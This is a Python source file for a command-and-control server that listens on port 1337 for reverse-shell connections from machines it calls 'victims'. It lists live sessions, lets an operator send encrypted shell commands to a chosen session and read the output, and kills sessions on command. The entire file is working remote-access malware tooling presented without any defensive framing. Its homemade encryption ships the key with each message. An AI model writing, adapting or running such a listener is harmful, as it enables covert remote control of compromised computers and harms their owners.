from shlex import split
import socket
import signal
import threading
from _thread import *
from textwrap import wrap
from time import sleep
from Crypto.Cipher import AES
from os import urandom
from rich.console import Console
from rich.table import Table
from rich import box
from rich.live import Live
import queue
from base64 import b64encode, b64decode
from subprocess import call

console = Console()
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


class ConnHandler:
    def __init__(self, ip=None, port=None):
        self.ip = ip
        self.port = port
        self.q = queue.Queue()
        self.connections = []
        self.address = []
        self.jobnum = [1, 2]
        self.key = None
        self.iv = None

    def CreateSocket(self):
        try:
            server.bind((self.ip, self.port))
            console.print(f'[-] Started listener on {self.ip}:{self.port}\n', style="red")
            server.listen(5)
            while True:
                victim, address = server.accept()
                self.connections.append(victim)
                self.address.append(address)
                console.print(f"[bold magenta][-] Got connection -> {address}[/bold magenta]", end="")
        except socket.error:
            console.print_exception()

    def list_Connections(self):
        for number, connection in enumerate(self.connections):
            """Filter live connections"""
            try:
                connection.send("l".encode())
                connection.recv(1024)
            except:
                del self.connections[number]
                del self.address[number]
        """Display tables after filtering"""
        table = Table(show_header=True, show_lines=True, box=box.ASCII)
        table.add_column("Sessions_id")
        table.add_column("Victim_Address")
        with Live(table, refresh_per_second=4) as live:
            if not self.connections:
                table.add_row("[bold red]x", "[red]No connections")
            for number, connection in enumerate(self.connections):
                table.add_row(str(number), str(self.address[number][0]))

    def encrypt(self, cmd):
        block_size = 16
        pad = lambda s: s + (block_size - len(s) % block_size) * "\x0e"  # chr(block_size - len(s) % block_size)
        self.key = urandom(16)
        self.iv = urandom(16)
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        if len(cmd) > 16:
            stream = wrap(cmd, 16)
            padded = [i if len(i) == 16 else pad(i) for i in stream]
            encrypted = [aes.encrypt(i.encode()) for i in padded]
            encrypted = b''.join(encrypted)
        else:
            encrypted = aes.encrypt(pad(cmd).encode())
        text_with_key = b64encode(self.key + self.iv + encrypted)
        return text_with_key

    def decrypt(self, data):
        data = b64decode(data)
        stream = [data[i:i + 16] for i in range(0, len(data), 16)]
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypted = [aes.decrypt(i) for i in stream]
        return b''.join(decrypted).decode()

    def Execute(self, sessionID):
        try:
            while True:
                cmd = console.input(f"[bold blue]({self.address[sessionID][0]})> [/bold blue]").strip()
                if "quit" in cmd:
                    break
                elif "reset" in cmd:
                    call('clear')
                    continue
                elif cmd == '':
                    continue
                enc_cmd = self.encrypt(cmd)
                self.connections[sessionID].send(enc_cmd)
                data = self.connections[sessionID].recv(1024)
                decrypted = self.decrypt(data)
                console.print(decrypted.replace(r"\n", "\n").strip(), style="cyan", end="")
        except KeyboardInterrupt:  # Doesn't work because __main__ exception needs to be handled
            console.print("[-] Ctrl+C detected -> type quit to exit")

    def kill_Sessions(self, sessionID=None):
        if sessionID == '*':
            for i, connection in enumerate(self.connections):
                console.print(f"[+] Killing {self.address[i]}", style="red")
                self.connections[i].send("die".encode())
                connection.close()
            self.connections.clear()
        else:
            sessionID = int(sessionID)
            self.connections[sessionID].close()
            del self.connections[sessionID]
            del self.address[sessionID]

    def shlexy(self):
        try:
            while True:
                cmd = console.input("[green]x(CMD)> [/green]").strip()
                cmd = split(cmd)
                if "list" in cmd:
                    self.list_Connections()
                elif "use" in cmd:
                    try:
                        sessionID = cmd[1]
                        self.Execute(int(sessionID))
                    except IndexError:
                        console.print("[!] Please enter a valid session_id", style="red")
                        continue
                elif "kill" in cmd:
                    sessionID = cmd[1]
                    self.kill_Sessions(sessionID)
                else:
                    continue
        except Exception:
            console.print("\n[!]Press Ctrl+C to exit", style="red")
            self.shlexy()

    def create_workers(self):
        for _ in range(2):
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    """Retrieve them"""

    def create_jobs(self):
        for x in self.jobnum:
            self.q.put(x)
        self.q.join()

    # Do next job that is in the queue (handle connections, send commands)
    def work(self):
        try:
            while True:
                x = self.q.get()
                if x == 1:
                    self.CreateSocket()
                if x == 2:
                    sleep(0.3)  # To ensure it loads after the listener
                    self.shlexy()
                self.q.task_done()
        except KeyboardInterrupt:
            console.print_exception()

    @staticmethod
    def signal_handler(sig, frame):
        exit()


if __name__ == '__main__':
    try:
        run = ConnHandler("0.0.0.0", 1337)
        run.create_workers()
        run.create_jobs()
    except KeyboardInterrupt:
        signal.signal(signal.SIGINT, ConnHandler.signal_handler)
        console.print("\n[!] Press Ctrl+C again to exit, or press enter to cancel", style="red", end="")
        signal.pause()
    except EOFError:
        exit()
